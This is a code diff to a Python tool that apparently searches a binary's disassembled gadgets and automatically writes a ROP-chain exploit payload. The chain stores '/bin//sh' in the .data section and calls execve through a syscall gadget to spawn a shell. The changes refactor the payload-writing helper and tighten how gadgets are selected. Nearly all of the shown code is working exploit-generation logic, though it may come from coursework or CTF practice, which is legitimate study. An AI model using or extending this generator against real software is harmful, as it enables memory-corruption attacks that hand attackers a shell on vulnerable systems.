@@ -2,15 +2,19 @@ import struct
 import sys
 import re
 
-REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "rsp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
-                "eax", "ebx", "ecx", "edx", "edi", "esi", "esp", "ebp", "r9d", "r10d", "r11d", "r12d", "r13d", "r14d", "r15d", 
-                "ax", "bx", "cx", "dx", "r9w", "r10w", "r11w", "r12w", "r13w", "r14w", "r15w", 
-                "al", "bl", "cl", "dl", "r9b", "r10b", "r11b", "r12b", "r13b", "r14b", "r15b", 
-                "ah", "bh", "ch", "dh"
+REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             ]
 
 def operands(csinsn):
-    return ', '.split(csinsn.op_str)
+    return csinsn.op_str.split(', ')
+
+def writeGadget(fd, gadget):
+    fd.write("payload += struct.pack('<Q', ")
+    fd.write(hex(int(gadget[0].address)))
+    fd.write(")")
+    fd.write("\t\t# " + str(gadget))
+    fd.write("\n\t")
+    
 
 def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 
 
@@ -30,11 +34,7 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
             # Write it into the file
             
             # Write address of "pop Reg; ret"
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst.address)))
-            fd.write(")")
-            fd.write("\t\t# Address of 'pop Reg; ret'")
-            fd.write("\n\t")
+            writeGadget(fd, gadget)
         
             # Write Const onto stack
             fd.write("payload += struct.pack('<Q', ")
@@ -71,13 +71,6 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
     print("Exiting...")
     sys.exit()
 
-def getSyscallList():
-    if(len(syscall)):
-        # print(syscall)
-        return syscall
-    else:
-        return list()
-
 # From the gadgets, this routine will return a list of gadgets that contain the target register as an operand.
 def queryGadgets(GadgetList, targetReg):
     L = GadgetList
@@ -105,16 +98,16 @@ def getMovQwordGadgets(Gadgets):
     movQwordGadgets = list()
     
     for gadget in Gadgets:
-        if len(gadget) >= 2 and gadget[-2].mnemonic == 'mov':
+        if len(gadget) == 2 and gadget[-2].mnemonic == 'mov':
                 ops = operands(gadget[-2])
-                if re.search("^qword ptr \[[a-z]+\]$", ops[0]) and ops[1] in REGISTERS and \
-                gadget[-2:] not in movQwordGadgets: # no duplicates please
-                    movQwordGadgets.append(gadget[-2:])
+                if re.search("^qword ptr \\[[a-z]+\\]$", ops[0]) and ops[1] in REGISTERS:
+                    movQwordGadgets.append(gadget)
     
     return movQwordGadgets
 
 def canWrite(movQwordGadgets, popGadgets):
     for gadget in movQwordGadgets:
+        if len(gadget) != 2: continue
         ops = operands(gadget[-2])
         op1 = ops[0][-4:-1]
         op2 = ops[1]
@@ -140,7 +133,6 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
 
     popGadgets = getPopGadgets(GadgetList) #TODO we can sophisticate this with LoadConstIntoReg-kind of idea
     movQwordGadgets = getMovQwordGadgets(GadgetList)
-    print(movQwordGadgets)
     movpopGadgets = canWrite(movQwordGadgets, popGadgets)
 
     if len(movpopGadgets) == 0: 
@@ -148,9 +140,9 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
         print("ROP Chaining failed")
         sys.exit()
 
-    movGadget = movpopGadgets[0][0]
-    popGadget1 = movpopGadgets[1][0]
-    popGadget2 = movpopGadgets[2][0]
+    movGadget = movpopGadgets[0]
+    popGadget1 = movpopGadgets[1]
+    popGadget2 = movpopGadgets[2]
    
     count = 0
     while len(data) > 0 : 
@@ -164,11 +156,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
             data = data[8:]
 
         # Execute popGadget1 => Reg1 will have .data's address
-        fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(popGadget1.address)))
-        fd.write(")")
-        fd.write("\t\t# Address of pop Reg1; ret")
-        fd.write("\n\t")
+        writeGadget(fd, popGadget1)
 
         # Put .data's address onto stack
         fd.write("payload += struct.pack('<Q', ")
@@ -180,11 +168,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
 
     
         # Execute popGadget2 => Reg2 will have "/bin/sh"
-        fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(popGadget2.address)))
-        fd.write(")")
-        fd.write("\t\t# Address of pop Reg2; ret")
-        fd.write("\n\t")
+        writeGadget(fd, popGadget2)
 
         # Put "/bin//sh" into stack
         fd.write("payload += struct.pack('<Q', ")
@@ -194,11 +178,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
         fd.write("\n\t")
 
         # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
-        fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(movGadget.address)))
-        fd.write(")")
-        fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
-        fd.write("\n\t")
+        writeGadget(fd, movGadget)
 
 def checkIfSyscallPresent(GadgetList) : 
 
@@ -206,6 +186,7 @@ def checkIfSyscallPresent(GadgetList) :
 
     x = 0
     for gadget in GadgetList:
+        if len(gadget) != 1: continue # We're only interested in bare syscall right now.
         inst = gadget[0]
         if inst.mnemonic == "syscall": 
             syscallList.append(gadget)
@@ -294,20 +275,15 @@ def execve_bin_sh(GadgetList, data_section_addr) :
     # Get syscall
     syscallList = checkIfSyscallPresent(GadgetList)
     if len(syscallList) == 0: 
-        syscallList = getSyscallList()
-        syscallAddress = syscallList[0][0]
+        print("No syscall gadget found.")
+        sys.exit()
     
     else : 
         syscallGadget = syscallList[0]
         syscallDict = syscallGadget[0]
         syscallAddress = syscallDict.address
     
-    fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(syscallAddress)))
-    fd.write(")")
-    fd.write("\t\t# Address of syscall")
-    fd.write("\n\t")
-
+    writeGadget(fd, syscallGadget)
     
     writeFooter(fd)
     print("-->Written the complete payload in execveROPChain.py")
